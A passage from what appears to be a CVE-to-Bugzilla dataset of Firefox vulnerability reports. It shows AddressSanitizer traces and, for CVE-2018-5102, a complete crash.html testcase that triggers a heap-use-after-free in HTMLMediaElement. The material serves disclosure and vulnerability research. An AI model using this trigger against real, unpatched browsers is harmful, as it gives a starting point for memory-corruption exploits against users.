/builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:513:10 #58 0x7efe736c0e41 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #59 0x7efe7362148b in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #60 0x7efe7362148b in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #61 0x7efe7362148b in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #62 0x7efe790b6a0f in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:159:27 #63 0x7efe7d3ede47 in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:877:22 #64 0x7efe7362148b in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #65 0x7efe7362148b in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #66 0x7efe7362148b in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #67 0x7efe7d3ed7fa in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:703:34 #68 0x4ec2de in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30 #69 0x4ec2de in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #70 0x7efe900a482f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #71 0x41dbc8 in _start (/fuzzer3/firefox/firefox+0x41dbc8) 0x6030002674d8 is located 0 bytes to the right of 24-byte region [0x6030002674c0,0x6030002674d8) allocated by thread T0 (file:// Content) here: #0 0x4bc44c in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ed85d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:84:17 #2 0x7efe726cd544 in Malloc /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:211:46 #3 0x7efe726cd544 in nsTArrayInfallibleAllocator::ResultTypeProxy nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::EnsureCapacity<nsTArrayInfallibleAllocator>(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:136 #4 0x7efe79ab003e in AppendElement<mozilla::FrameProperties::PropertyValue, nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2217:47 #5 0x7efe79ab003e in AddInternal /builds/worker/workspace/build/src/layout/base/FrameProperties.h:451 #6 0x7efe79ab003e in Add<nsMargin> /builds/worker/workspace/build/src/layout/base/FrameProperties.h:190 #7 0x7efe79ab003e in AddProperty<nsMargin> /builds/worker/workspace/build/src/layout/generic/nsIFrame.h:3609 #8 0x7efe79ab003e in nsFrame::DidSetStyleContext(nsStyleContext*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:1132 #9 0x7efe7989f95e in SetStyleContext /builds/worker/workspace/build/src/layout/generic/nsIFrame.h:805:7 #10 0x7efe7989f95e in mozilla::ServoRestyleManager::DoReparentStyleContext(nsIFrame*, mozilla::ServoStyleSet&) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1626 #11 0x7efe7989ff1c in mozilla::ServoRestyleManager::ReparentFrameDescendants(nsIFrame*, nsIFrame*, mozilla::ServoStyleSet&) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1676:9 #12 0x7efe7989fb02 in mozilla::ServoRestyleManager::DoReparentStyleContext(nsIFrame*, mozilla::ServoStyleSet&) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1659:3 #13 0x7efe7989ff1c in mozilla::ServoRestyleManager::ReparentFrameDescendants(nsIFrame*, nsIFrame*, mozilla::ServoStyleSet&) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1676:9 #14 0x7efe7989fb02 in mozilla::ServoRestyleManager::DoReparentStyleContext(nsIFrame*, mozilla::ServoStyleSet&) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1659:3 #15 0x7efe7989ff1c in mozilla::ServoRestyleManager::ReparentFrameDescendants(nsIFrame*, nsIFrame*, mozilla::ServoStyleSet&) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1676:9 #16 0x7efe7989fb02 in mozilla::ServoRestyleManager::DoReparentStyleContext(nsIFrame*, mozilla::ServoStyleSet&) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1659:3 #17 0x7efe7989f45e in mozilla::ServoRestyleManager::DoReparentStyleContext(nsIFrame*, mozilla::ServoStyleSet&) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1538:7 #18 0x7efe7989c0a1 in mozilla::ServoRestyleManager::ReparentStyleContext(nsIFrame*) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1497:3 #19 0x7efe79c34397 in ReparentStyleContext /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerInlines.h:79:3 #20 0x7efe79c34397 in PullOneFrame /builds/worker/workspace/build/src/layout/generic/nsInlineFrame.cpp:1058 #21 0x7efe79c34397 in nsFirstLineFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsInlineFrame.cpp:1118 #22 0x7efe79c2f8c9 in nsLineLayout::ReflowFrame(nsIFrame*, nsReflowStatus&, mozilla::ReflowOutput*, bool&) /builds/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:922:13 #23 0x7efe79a8ec74 in nsBlockFrame::ReflowInlineFrame(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4175:15 #24 0x7efe79a8d8b2 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3971:5 #25 0x7efe79a855e6 in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3845:9 #26 0x7efe79a7edd2 in nsBlockFrame::ReflowLine(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2829:5 #27 0x7efe79a74a4f in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2365:7 #28 0x7efe79a6bb3b in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1236:3 #29 0x7efe79ac985c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:934:14 #30 0x7efe79ace8bd in nsColumnSetFrame::ReflowChildren(mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) /builds/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:810:7 #31 0x7efe79ad3e3e in ReflowColumns /builds/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:507:19 #32 0x7efe79ad3e3e in nsColumnSetFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsColumnSetFrame.cpp:1245 #33 0x7efe79ac985c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:934:14 #34 0x7efe79ac80e4 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:757:5 #35 0x7efe79ac985c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:934:14 #36 0x7efe79b947e8 in nsHTMLScrollFrame::ReflowScrolledFrame(mozilla::ScrollReflowInput*, bool, bool, mozilla::ReflowOutput*, bool) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:552:3 #37 0x7efe79b95e9e in nsHTMLScrollFrame::ReflowContents(mozilla::ScrollReflowInput*, mozilla::ReflowOutput const&) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:664:3 #38 0x7efe79b991a9 in nsHTMLScrollFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:1041:3 SUMMARY: AddressSanitizer: heap-buffer-overflow /builds/worker/workspace/build/src/layout/base/FrameProperties.h:399:16 in Equals Shadow bytes around the buggy address: 0x0c0680044e40: fd fa fa fa fd fd fd fd fa fa fd fd fd fa fa fa 0x0c0680044e50: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fd 0x0c0680044e60: fa fa fd fd fd fa fa fa fd fd fd fd fa fa fd fd 0x0c0680044e70: fd fa fa fa fd fd fd fd fa fa 00 00 00 fa fa fa 0x0c0680044e80: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fd =>0x0c0680044e90: fa fa fd fd fd fa fa fa 00 00 00[fa]fa fa 00 00 0x0c0680044ea0: 00 00 fa fa fd fd fd fd fa fa 00 00 00 00 fa fa 0x0c0680044eb0: fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd 0x0c0680044ec0: fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd 0x0c0680044ed0: fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa 0x0c0680044ee0: 00 00 04 fa fa fa 00 00 00 00 fa fa fd fd fd fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==20193==ABORTING"
      }
    ],
    "CVE-2018-5102": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1419363",
        "title": "heap-use-after-free in mozilla::dom::HTMLMediaElement::NotifyMediaStreamTracksAvailable",
        "description": "The following testcase crashes the latest ASAN build of Firefox 59.0a1 (SourceStamp=d4753dc14b2ab9c42123b6d60a68106df40f45cd). It requires the fuzzPriv extension. crash.html: <script> function spin () { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try{x.send(\"X\");}catch(e){} } function start() { o55=document.createElementNS('http://www.w3.org/1999/xhtml','video'); o73=document.createElementNS('http://www.w3.org/1999/xhtml','video'); o81=o73.mozCaptureStreamUntilEnded(); o55.srcObject=o81; spin(); o55=null; o81=null; o73.setAttribute('src','data:video/webm;base64,GkXfowEAAAAAAAAfQoaBAUL3gQFC8oEEQvOBCEKChHdlYm1Ch4ECQoWBAhhTgGcBAAAAAAACfhFNm3RALE27i1OrhBVJqWZTrIHfTbuMU6uEFlSua1OsggEwTbuMU6uEHFO7a1OsggJh7AEAAAAAAACkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVSalmAQAAAAAAAEUq17GDD0JATYCNTGF2ZjU2LjQwLjEwMVdBjUxhdmY1Ni40MC4xMDFzpJAI9vs3HzFdyEBxXtVbMzM0RImIQJdwAAAAAAAWVK5rAQAAAAAAADuuAQAAAAAAADLXgQFzxYEBnIEAIrWcg3VuZIaFVl9WUDmDgQEj44OEDuaygOABAAAAAAAABrCBAbqBAR9DtnUBAAAAAAAA3ueBAKOmgQAAgKJJg0IAAAAAAMAHBIODCoAABAAAEb//+UIU3iZw//Z8AACjxIEA+gCkAIBJegCGwAAGIAAAALn///wyA/////7OSv///y4AAKYAQJacAExAAAMgAAAc//+AD////+bR///nIADBIBzBo5uBAfQApgBAlpwATcAAAyAAAAD8//4WX/5f8KCjoIEC7gCmAECWnABNgAADIAAAALn+eD///98F////TgAAo5OBA+gApgEAlpwATWAAAyAAAF5Yo5eBBOIApgBBDpwATSAAAyAAADTN/8gAABxTu2sBAAAAAAAAEbuPs4EAt4r3gQHxggF38IED'); o73.play(); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC();; } </script> <body onload=\"start()\"></body> ASAN ouput: ================================================================= ==24229==ERROR: AddressSanitizer: heap-use-after-free on address 0x61a00009eb70 at pc 0x7ff2afdc4883 bp 0x7ffea6c8e490 sp 0x7ffea6c8e488 READ of size 8 at 0x61a00009eb70 thread T0 (file:// Content) #0 0x7ff2afdc4882 in operator! /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:312:36 #1 0x7ff2afdc4882 in mozilla::dom::HTMLMediaElement::NotifyMediaStreamTracksAvailable(mozilla::DOMMediaStream*) /builds/worker/workspace/build/src/dom/html/HTMLMediaElement.cpp:2258 #2 0x7ff2affd159f in mozilla::DOMMediaStream::CheckTracksAvailable() /builds/worker/workspace/build/src/dom/media/DOMMediaStream.cpp:1361:19 #3 0x7ff2affeba42 in applyImpl<mozilla::DOMMediaStream, void (mozilla::DOMMediaStream::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1142:12 #4 0x7ff2affeba42 in apply<mozilla::DOMMediaStream, void (mozilla::DOMMediaStream::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1148 #5 0x7ff2affeba42 in mozilla::detail::RunnableMethodImpl<mozilla::DOMMediaStream*, void (mozilla::DOMMediaStream::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1192 #6 0x7ff2aad2a428 in mozilla::AutoTaskDispatcher::TaskGroupRunnable::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/TaskDispatcher.h:214:37 #7 0x7ff2aad2758b in mozilla::EventTargetWrapper::Runner::Run() /builds/worker/workspace/build/src/xpcom/threads/AbstractThread.cpp:150:32 #8 0x7ff2aad24861 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:396:25 #9 0x7ff2aad4a196 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1037:14 #10 0x7ff2aad64b18 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:513:10 #11 0x7ff2abb3ff41 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #12 0x7ff2abaa06bb in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #13 0x7ff2abaa06bb in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #14 0x7ff2abaa06bb in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #15 0x7ff2b15a723f in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:159:27 #16 0x7ff2b58dede7 in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:877:22 #17 0x7ff2abaa06bb in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #18 0x7ff2abaa06bb in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #19 0x7ff2abaa06bb in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #20 0x7ff2b58de79a in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:703:34 #21 0x4ebb1e in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30 #22 0x4ebb1e in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #23 0x7ff2c857c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #24 0x41d408 in _start (/fuzzer3/firefox/firefox+0x41d408) 0x61a00009eb70 is located 240 bytes inside of 1400-byte region [0x61a00009ea80,0x61a00009eff8) freed by thread T0 (file:// Content) here: #0 0x4bb93b in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7ff2aabe3a17 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2729:25 #2 0x7ff2aabeb0bb in FreeSnowWhite /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2917:3 #3 0x7ff2aabeb0bb in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3925 #4 0x7ff2aabea5d3 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3746:9 #5 0x7ff2aabee420 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4315:21 #6 0x7ff2adc7ac0d in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1505:3 #7 0x7ff2ad7b6a5b in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1450:3 #8 0x7ff2aad74ce1 in NS_InvokeByIndex /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:129 #9 0x7ff2ac587df0 in Invoke /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1996:12 #10 0x7ff2ac587df0 in Call /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1315 #11 0x7ff2ac587df0 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1282 #12 0x7ff2ac58eb7f in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:929:12 #13 0x7ff2b5b88e60 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #14 0x7ff2b5b88e60 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #15 0x7ff2b5b7437b in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #16 0x7ff2b5b7437b in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3098 #17 0x7ff2b5b5c43a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #18 0x7ff2b5b88f5f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #19 0x7ff2b5b89e52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #20 0x7ff2b65caef3 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2967:12 #21 0x7ff2ac4a739b in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7ff2b5b88e60 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #23 0x7ff2b5b88e60 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #24 0x7ff2b5b7437b in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #25 0x7ff2b5b7437b in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3098 #26 0x7ff2b5b5c43a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #27 0x7ff2b5b88f5f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #28 0x7ff2b5b89e52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #29 0x7ff2b65ccd7b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3026:12 #30 0x7ff2af10f335 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #31 0x7ff2afb12d5d in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #32 0x7ff2afb12d5d in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #33 0x7ff2afadade6 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1117:51 #34 0x7ff2afadcfb2 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1292:20 #35 0x7ff2afabe2b1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #36 0x7ff2afac1782 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:826:9 #37 0x7ff2b1e2e1de in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1064:7 previously allocated by thread T0 (file:// Content) here: #0 0x4bbc8c in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ed09d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:84:17 #2 0x7ff2afe723a6 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:206:12 #3 0x7ff2afe723a6 in NS_NewHTMLVideoElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/HTMLVideoElement.cpp:38 #4 0x7ff2afec7c66 in CreateHTMLElement /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:392:41 #5 0x7ff2afec7c66 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsTSubstring<char16_t> const*, mozilla::dom::CustomElementDefinition*) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:363 #6 0x7ff2adcabdd5 in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsTSubstring<char16_t> const*) /builds/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:182:12 #7 0x7ff2adb775f7 in nsDocument::CreateElementNS(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::dom::ElementCreationOptionsOrString const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:6143:8 #8 0x7ff2af1539f4 in mozilla::dom::DocumentBinding::createElementNS(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:1305:59 #9 0x7ff2af6ec630 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3040:13 #10 0x7ff2b5b88e60 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #11 0x7ff2b5b88e60 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #12 0x7ff2b5b7437b in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #13 0x7ff2b5b7437b in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3098 #14 0x7ff2b5b5c43a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #15 0x7ff2b5b88f5f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #16 0x7ff2b5b89e52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #17 0x7ff2b65ccd7b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3026:12 #18 0x7ff2af10f335 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #19 0x7ff2afb12d5d in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #20 0x7ff2afb12d5d in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #21 0x7ff2afadade6 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1117:51 #22 0x7ff2afadcfb2 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1292:20 #23 0x7ff2afabe2b1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, 